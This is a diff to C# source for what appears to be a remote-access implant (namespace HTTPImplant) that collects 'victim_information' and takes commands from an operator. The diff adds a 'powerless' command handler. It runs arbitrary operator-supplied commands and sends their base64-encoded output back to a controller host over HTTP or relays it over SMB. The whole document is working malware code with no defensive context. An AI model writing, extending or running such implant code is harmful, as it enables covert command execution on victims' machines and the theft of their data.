@@ -51,6 +51,7 @@ namespace HTTPImplant
 
         public static void Main(string[] args)
         {
+
             string implantId = Environment.MachineName;
 
             string victim_information = GenerateJson();
@@ -144,6 +145,19 @@ namespace HTTPImplant
                                         }
                                         break;
 
+                                    case "powerless":
+                                        string outputPL = Commands.command(command.command, command.Args);
+                                        string outputBase64PL = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputPL));
+                                        if (SMB)
+                                        {
+                                            SMBClient.SendData(outputBase64PL, computername);
+                                        }
+                                        else
+                                        {
+                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64PL);
+                                        }
+                                        break;
+
                                     case "enable_smb_client":
                                         SMB = true;
                                         computername = command.Args;
@@ -178,8 +192,8 @@ namespace HTTPImplant
                                     case "cd":
                                         //Console.WriteLine("Changing the current directory");
                                         string path = command.Args;
-                                        string output = Commands.SetCurrentDir(path);
-                                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                                        string outputCD = Commands.SetCurrentDir(path);
+                                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputCD));
                                         if (SMB)
                                         {
                                             SMBClient.SendData(outputBase64, computername);
